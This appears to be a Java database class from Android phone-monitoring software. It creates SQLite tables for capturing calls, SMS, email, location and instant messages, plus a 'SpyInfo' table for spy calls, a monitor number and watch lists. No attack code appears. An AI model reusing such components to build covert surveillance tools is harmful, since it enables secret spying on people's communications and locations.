package com.fx.preference;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

import com.fx.maind.ref.MainDaemonResource;
import com.vvt.database.VtDatabase;
import com.vvt.logger.FxLog;

class PreferenceDatabase extends VtDatabase {

	private static final String TAG = "PreferenceDatabase";
	private static final String DATABASE_NAME = PreferenceDatabaseMetadata.DB_NAME;
	private static PreferenceDatabase sInstance;
	
	public static PreferenceDatabase getInstance() {
		if (sInstance == null) {
			sInstance = new PreferenceDatabase();
		}
		return sInstance;
	}
	
	private PreferenceDatabase() { }
	
	protected void createTables() {
		String systemPath = getDatabasePath();
		
		SQLiteDatabase db = null;
		
		try {
			db = SQLiteDatabase.openOrCreateDatabase(systemPath, null);
			createProductInfoTable(db);
			createPreferenceTable(db);
			createConnectionHistoryTable(db);
			createActivationResponseTable(db);
			createSpyInfoTable(db);
			createWatchListTable(db);
		}
		catch (SQLiteException e) {
			FxLog.e(TAG, String.format("createTables # Error: %s", e));
		}
		finally {
			if (db != null) {
				db.close();
			}
		}
	}
	
	protected void deleteTables() {
		SQLiteDatabase db = getWritableDatabase();
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", 
				PreferenceDatabaseMetadata.ProductInfo.TABLE_NAME));
		
		db.execSQL(String.format("DROP TABLE IF EXISTS %1$s", 
				PreferenceDatabaseMetadata.ActivationResponse.TABLE_NAME));
		db.close();
	}
	
	@Override
	protected String getDebugTag() {
		return TAG;
	}

	@Override
	protected String getFolderName() {
		return MainDaemonResource.EXTRACTING_PATH;
	}
	
	@Override
	protected String getFilename() {
		return DATABASE_NAME;
	}

	private void createProductInfoTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER, " +
				"%3$s TEXT, " +
				"%4$s TEXT, " +
				"%5$s TEXT, " +
				"%6$s TEXT, " +
				"%7$s TEXT, " +
				"%8$s TEXT, " +
				"%9$s TEXT, " +
				"%10$s TEXT, " +
				"%11$s TEXT, " +
				"%12$s TEXT, " +
				"%13$s TEXT);"
				, PreferenceDatabaseMetadata.ProductInfo.TABLE_NAME // 1
				, PreferenceDatabaseMetadata.ProductInfo.EDITION // 2
				, PreferenceDatabaseMetadata.ProductInfo.ID // 3
				, PreferenceDatabaseMetadata.ProductInfo.NAME // 4
				, PreferenceDatabaseMetadata.ProductInfo.DISPLAY_NAME // 5
				, PreferenceDatabaseMetadata.ProductInfo.BUILD_DATE // 6
				, PreferenceDatabaseMetadata.ProductInfo.VERSION_NAME // 7
				, PreferenceDatabaseMetadata.ProductInfo.VERSION_MAJOR // 8
				, PreferenceDatabaseMetadata.ProductInfo.VERSION_MINOR // 9
				, PreferenceDatabaseMetadata.ProductInfo.VERSION_BUILD // 10
				, PreferenceDatabaseMetadata.ProductInfo.URL_ACTIVATION // 11
				, PreferenceDatabaseMetadata.ProductInfo.URL_DELIVERY // 12
				, PreferenceDatabaseMetadata.ProductInfo.PACKAGE_NAME
				);
		
		db.execSQL(sql);
	}
	
	private void createPreferenceTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER, " +
				"%3$s INTEGER, " +
				"%4$s INTEGER, " +
				"%5$s INTEGER, " +
				"%6$s INTEGER, " +
				"%7$s INTEGER, " +
				"%8$s INTEGER, " +
				"%9$s INTEGER, " + 
				"%10$s INTEGER, " + 
				"%11$s INTEGER);"
				, PreferenceDatabaseMetadata.EventPreference.TABLE_NAME // 1
				, PreferenceDatabaseMetadata.EventPreference.EVENTS_CAPTURING_STATUS // 2
				, PreferenceDatabaseMetadata.EventPreference.CALL_CAPTURING_STATUS // 3
				, PreferenceDatabaseMetadata.EventPreference.SMS_CAPTURING_STATUS // 4
				, PreferenceDatabaseMetadata.EventPreference.EMAIL_CAPTURING_STATUS // 5
				, PreferenceDatabaseMetadata.EventPreference.LOCATION_CAPTURING_STATUS // 6
				, PreferenceDatabaseMetadata.EventPreference.IM_CAPTURING_STATUS // 7
				, PreferenceDatabaseMetadata.EventPreference.GPS_TIME_INTERVAL // 8
				, PreferenceDatabaseMetadata.EventPreference.MAX_EVENTS // 9
				, PreferenceDatabaseMetadata.EventPreference.DELIVERY_PERIOD // 10
				, PreferenceDatabaseMetadata.EventPreference.EVENT_ID // 11
				);
		
		db.execSQL(sql);
	}
	
	private void createConnectionHistoryTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s TEXT, " +
				"%4$s TEXT, " +
				"%5$s INTEGER, " +
				"%6$s INTEGER, " +
				"%7$s TEXT, " +
				"%8$s INTEGER, " +
				"%9$s INTEGER, " +
				"%10$s INTEGER, " +
				"%11$s INTEGER, " +
				"%12$s INTEGER, " +
				"%13$s TEXT);"
				, PreferenceDatabaseMetadata.ConnectionHistory.TABLE_NAME // 1
				, PreferenceDatabaseMetadata.ConnectionHistory.ROW_ID // 2
				, PreferenceDatabaseMetadata.ConnectionHistory.ACTION // 3
				, PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_TYPE // 4
				, PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_START_TIME // 5
				, PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_END_TIME // 6
				, PreferenceDatabaseMetadata.ConnectionHistory.CONNECTION_STATUS // 7
				, PreferenceDatabaseMetadata.ConnectionHistory.RESPONSE_CODE // 8
				, PreferenceDatabaseMetadata.ConnectionHistory.HTTP_STATUS_CODE // 9
				, PreferenceDatabaseMetadata.ConnectionHistory.NUM_EVENTS_SENT // 10
				, PreferenceDatabaseMetadata.ConnectionHistory.NUM_EVENTS_PROCESSED // 11
				, PreferenceDatabaseMetadata.ConnectionHistory.TIMESTAMP // 12
				, PreferenceDatabaseMetadata.ConnectionHistory.MESSAGE // 13
				);
		
		db.execSQL(sql);
	}
	
	private void createActivationResponseTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER, " +
				"%3$s INTEGER, " +
				"%4$s TEXT, " +
				"%5$s TEXT, " +
				"%6$s TEXT);"
				, PreferenceDatabaseMetadata.ActivationResponse.TABLE_NAME // 1
				, PreferenceDatabaseMetadata.ActivationResponse.IS_ACTIVATE_ACTION // 2
				, PreferenceDatabaseMetadata.ActivationResponse.IS_SUCCESS // 3
				, PreferenceDatabaseMetadata.ActivationResponse.MESSAGE // 4
				, PreferenceDatabaseMetadata.ActivationResponse.ACTIVATION_STATUS // 5
				, PreferenceDatabaseMetadata.ActivationResponse.HASH_CODE // 6
				);
		db.execSQL(sql);
	}
	
	private void createSpyInfoTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER, " +
				"%3$s TEXT, " +
				"%4$s INTEGER, " +
				"%5$s INTEGER, " +
				"%6$s INTEGER, " +
				"%7$s INTEGER, " +
				"%8$s INTEGER, " +
				"%9$s INTEGER, " +
				"%10$s TEXT, " +
				"%11$s TEXT, " +
				"%12$s TEXT " +
				");"
				, PreferenceDatabaseMetadata.SpyInfo.TABLE_NAME // 1
				, PreferenceDatabaseMetadata.SpyInfo.IS_SPY_CALL_ENABLED // 2
				, PreferenceDatabaseMetadata.SpyInfo.MONITOR_NUMBER // 3
				, PreferenceDatabaseMetadata.SpyInfo.WATCH_ALL_NUMBER // 4
				, PreferenceDatabaseMetadata.SpyInfo.WATCH_IN_CONTACTS // 5
				, PreferenceDatabaseMetadata.SpyInfo.WATCH_NOT_IN_CONTACTS // 6
				, PreferenceDatabaseMetadata.SpyInfo.WATCH_IN_WATCH_LIST // 7
				, PreferenceDatabaseMetadata.SpyInfo.WATCH_PRIVATE_NUMBER // 8
				, PreferenceDatabaseMetadata.SpyInfo.WATCH_UNKNOWN_NUMBER // 9
				, PreferenceDatabaseMetadata.SpyInfo.KW_1 // 10
				, PreferenceDatabaseMetadata.SpyInfo.KW_2 // 11
				, PreferenceDatabaseMetadata.SpyInfo.SIM_ID // 12
				);
		db.execSQL(sql);
	}

	private void createWatchListTable(SQLiteDatabase db) {
		String sql = String.format("CREATE TABLE %1$s " +
				"(%2$s INTEGER PRIMARY KEY, " +
				"%3$s TEXT" +
				");"
				, PreferenceDatabaseMetadata.WatchList.TABLE_NAME // 1
				, PreferenceDatabaseMetadata.WatchList.ROW_ID // 2
				, PreferenceDatabaseMetadata.WatchList.WATCH_NUMBER // 3
				);
		db.execSQL(sql);
	}
}
